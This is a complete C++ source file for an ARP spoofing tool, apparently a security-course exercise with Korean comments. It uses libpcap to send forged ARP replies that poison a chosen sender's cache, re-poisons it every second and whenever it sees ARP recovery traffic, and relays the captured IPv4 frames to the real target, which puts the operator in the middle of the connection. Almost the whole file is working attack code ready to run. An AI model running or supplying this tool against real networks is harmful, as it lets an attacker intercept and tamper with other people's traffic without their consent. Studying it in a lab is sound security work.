#include <atomic>
#include <chrono>
#include <csignal>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <ctime>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include "arphdr.h"
#include "ethhdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
  EthHdr eth_;
  ArpHdr arp_;
};
#pragma pack(pop)

// 잘리지 않고 캡처/릴레이하기 위한 snaplen
static const int kSnapLen = 65536;

// 한 sender 와, 그가 통신하려던 target 정보
struct Flow final {
  Ip senderIp_;
  Ip targetIp_;
  Mac senderMac_; // 감염시킬 sender 의 MAC
  Mac targetMac_; // 릴레이해서 보내줄 실제 target 의 MAC
};

// spoof part
class ArpSpoof final {
public:
  ~ArpSpoof();

  // 인터페이스 오픈, 내 MAC/IP 조회, 각 flow 의 MAC resolve
  bool init(const char *dev, const std::vector<std::pair<Ip, Ip>> &pairs);

  void run(); // 최초 감염 + 재감염 스레드 + 릴레이/recovery 루프
  void stop() { run_.store(false); }

private:
  void sendArp(Mac ethDmac, Mac ethSmac, uint16_t op, Mac arpSmac, Ip arpSip,
               Mac arpTmac, Ip arpTip);
  Mac resolveMac(Ip ip);
  void infect(const Flow &f);
  void recover(const Flow &f);

  void periodicInfect(); // 재감염 스레드 본체
  void relayLoop();      // 릴레이 + recovery 감지

  static bool getMyMac(const char *dev, Mac &mac);
  static bool getMyIp(const char *dev, Ip &ip);

private:
  pcap_t *rx_ = nullptr; // 캡처 전용 핸들
  pcap_t *tx_ = nullptr; // 송신 전용 핸들 (rx 와 분리)
  std::mutex txMutex_;

  Mac myMac_;
  Ip myIp_;
  std::vector<Flow> flows_;
  std::atomic<bool> run_{true};
};

ArpSpoof::~ArpSpoof() {
  // 종료 시 ARP 테이블 복구
  for (const auto &f : flows_)
    for (int k = 0; k < 3; ++k)
      recover(f);
  if (rx_ != nullptr)
    pcap_close(rx_);
  if (tx_ != nullptr)
    pcap_close(tx_);
}

// my interface MAC/IP
bool ArpSpoof::getMyMac(const char *dev, Mac &mac) {
  int fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (fd < 0)
    return false;
  struct ifreq ifr;
  memset(&ifr, 0, sizeof(ifr));
  strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
  bool ok = (ioctl(fd, SIOCGIFHWADDR, &ifr) >= 0);
  close(fd);
  if (!ok)
    return false;
  mac = Mac(reinterpret_cast<uint8_t *>(ifr.ifr_hwaddr.sa_data));
  return true;
}

bool ArpSpoof::getMyIp(const char *dev, Ip &ip) {
  int fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (fd < 0)
    return false;
  struct ifreq ifr;
  memset(&ifr, 0, sizeof(ifr));
  strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
  ifr.ifr_addr.sa_family = AF_INET;
  bool ok = (ioctl(fd, SIOCGIFADDR, &ifr) >= 0);
  close(fd);
  if (!ok)
    return false;
  struct sockaddr_in *sin =
      reinterpret_cast<struct sockaddr_in *>(&ifr.ifr_addr);
  ip = Ip(ntohl(sin->sin_addr.s_addr));
  return true;
}

void ArpSpoof::sendArp(Mac ethDmac, Mac ethSmac, uint16_t op, Mac arpSmac,
                       Ip arpSip, Mac arpTmac, Ip arpTip) {
  EthArpPacket packet;
  packet.eth_.dmac_ = ethDmac;
  packet.eth_.smac_ = ethSmac;
  packet.eth_.type_ = htons(EthHdr::Arp);
  packet.arp_.hrd_ = htons(ArpHdr::ETHER);
  packet.arp_.pro_ = htons(EthHdr::Ip4);
  packet.arp_.hln_ = sizeof(Mac); // MAC 길이 = 6
  packet.arp_.pln_ = sizeof(Ip);  // IP  길이 = 4
  packet.arp_.op_ = htons(op);
  packet.arp_.smac_ = arpSmac;
  packet.arp_.sip_ = htonl(arpSip);
  packet.arp_.tmac_ = arpTmac;
  packet.arp_.tip_ = htonl(arpTip);

  std::lock_guard<std::mutex> lock(txMutex_);
  int res = pcap_sendpacket(tx_, reinterpret_cast<const u_char *>(&packet),
                            sizeof(EthArpPacket));
  if (res != 0)
    fprintf(stderr, "pcap_sendpacket error %d %s\n", res, pcap_geterr(tx_));
}

Mac ArpSpoof::resolveMac(Ip ip) {
  for (int attempt = 0; attempt < 3; ++attempt) {
    // Broadcast ARP request: "who has ip? tell myIp_"
    sendArp(Mac::broadcastMac(), myMac_, ArpHdr::Request, myMac_, myIp_,
            Mac::nullMac(), ip);

    time_t start = time(nullptr);
    while (time(nullptr) - start < 2) {
      struct pcap_pkthdr *header;
      const u_char *data;
      int res = pcap_next_ex(rx_, &header, &data);
      if (res != 1)
        continue;
      if (header->caplen < sizeof(EthArpPacket))
        continue;

      auto *p = reinterpret_cast<const EthArpPacket *>(data);
      if (p->eth_.type() != EthHdr::Arp)
        continue;
      if (p->arp_.op() != ArpHdr::Reply)
        continue;
      if (p->arp_.sip() != ip)
        continue; // sip() 은 host order Ip
      if (p->arp_.tip() != myIp_)
        continue;
      return p->arp_.smac_;
    }
  }
  fprintf(stderr, "resolveMac failed for %s\n", std::string(ip).c_str());
  exit(-1);
}

// sender : targetIp = 내 MAC
void ArpSpoof::infect(const Flow &f) {
  sendArp(f.senderMac_, myMac_, ArpHdr::Reply, myMac_, f.targetIp_,
          f.senderMac_, f.senderIp_);
}

// sender :진짜 target MAC 을 알려줌
void ArpSpoof::recover(const Flow &f) {
  sendArp(f.senderMac_, f.targetMac_, ArpHdr::Reply, f.targetMac_, f.targetIp_,
          f.senderMac_, f.senderIp_);
}

// 재감염 스레드
void ArpSpoof::periodicInfect() {
  while (run_.load()) {
    for (const auto &f : flows_)
      infect(f);
    // 1초 대기(무선 loss 대비)
    for (int i = 0; i < 10 && run_.load(); ++i)
      std::this_thread::sleep_for(std::chrono::milliseconds(100));
  }
}

// 릴레이 + recovery 감지
void ArpSpoof::relayLoop() {
  while (run_.load()) {
    struct pcap_pkthdr *header;
    const u_char *data;
    int res = pcap_next_ex(rx_, &header, &data);
    if (res == 0)
      continue;
    if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
      break;
    if (header->caplen < sizeof(EthHdr))
      continue;

    u_char *frame = const_cast<u_char *>(data);
    EthHdr *eth = reinterpret_cast<EthHdr *>(frame);

    // 무한루프 방지
    if (eth->smac_ == myMac_)
      continue;

    //  ARP: recovery 시도 대비  flow 재감염
    if (eth->type() == EthHdr::Arp) {
      if (header->caplen < sizeof(EthArpPacket))
        continue;
      ArpHdr *arp = reinterpret_cast<ArpHdr *>(frame + sizeof(EthHdr));
      Ip sip = arp->sip();
      Ip tip = arp->tip();
      for (const auto &f : flows_) {
        bool involved = sip == f.senderIp_ || tip == f.senderIp_ ||
                        sip == f.targetIp_ || tip == f.targetIp_;
        if (involved)
          infect(f);
      }
      continue;
    }

    // IPv4 : sender -> 나 -> 진짜 target
    if (eth->type() == EthHdr::Ip4) {
      if (eth->dmac_ != myMac_)
        continue; // 나에게 온 것만
      for (const auto &f : flows_) {
        if (eth->smac_ != f.senderMac_)
          continue;
        eth->smac_ = myMac_;       // src = 나
        eth->dmac_ = f.targetMac_; // dst = 진짜 target
        std::lock_guard<std::mutex> lock(txMutex_);
        int r = pcap_sendpacket(tx_, frame, header->caplen);
        if (r != 0)
          fprintf(stderr, "relay error %s\n", pcap_geterr(tx_));
        break;
      }
    }
  }
}

bool ArpSpoof::init(const char *dev,
                    const std::vector<std::pair<Ip, Ip>> &pairs) {
  char errbuf[PCAP_ERRBUF_SIZE];
  rx_ = pcap_open_live(dev, kSnapLen, 1, 1, errbuf);
  if (rx_ == nullptr) {
    fprintf(stderr, "pcap_open_live(%s) rx failed(%s)\n", dev, errbuf);
    return false;
  }
  tx_ = pcap_open_live(dev, kSnapLen, 1, 1, errbuf);
  if (tx_ == nullptr) {
    fprintf(stderr, "pcap_open_live(%s) tx failed(%s)\n", dev, errbuf);
    return false;
  }

  if (!getMyMac(dev, myMac_)) {
    fprintf(stderr, "getMyMac failed\n");
    return false;
  }
  if (!getMyIp(dev, myIp_)) {
    fprintf(stderr, "getMyIp failed\n");
    return false;
  }
  printf("[*] my mac = %s, my ip = %s\n", std::string(myMac_).c_str(),
         std::string(myIp_).c_str());

  for (size_t i = 0; i < pairs.size(); ++i) {
    Flow f;
    f.senderIp_ = pairs[i].first;
    f.targetIp_ = pairs[i].second;
    f.senderMac_ = resolveMac(f.senderIp_);
    f.targetMac_ = resolveMac(f.targetIp_);
    flows_.push_back(f);
    printf("[flow %zu] sender %s(%s) <- target %s(%s)\n", i,
           std::string(f.senderIp_).c_str(), std::string(f.senderMac_).c_str(),
           std::string(f.targetIp_).c_str(), std::string(f.targetMac_).c_str());
  }
  return true;
}

void ArpSpoof::run() {
  for (const auto &f : flows_)
    infect(f); // 최초 감염
  std::thread infector(&ArpSpoof::periodicInfect, this);
  relayLoop(); // 릴레이 + recovery 감지
  run_.store(false);
  infector.join();
  // ARP 테이블 복구는 소멸자에서 처리
}

static ArpSpoof *g_self = nullptr;
static void onSigint(int) {
  if (g_self != nullptr)
    g_self->stop();
}

static void usage() {
  printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> "
         "[<sender ip 2> <target ip 2> ...]\n");
  printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char *argv[]) {
  if (argc < 4 || (argc % 2) != 0) {
    usage();
    return -1;
  }

  std::vector<std::pair<Ip, Ip>> pairs;
  for (int i = 2; i + 1 < argc; i += 2)
    pairs.emplace_back(Ip(std::string(argv[i])), Ip(std::string(argv[i + 1])));

  ArpSpoof app;
  g_self = &app;
  signal(SIGINT, onSigint);

  if (!app.init(argv[1], pairs))
    return -1;
  app.run();
  return 0;
}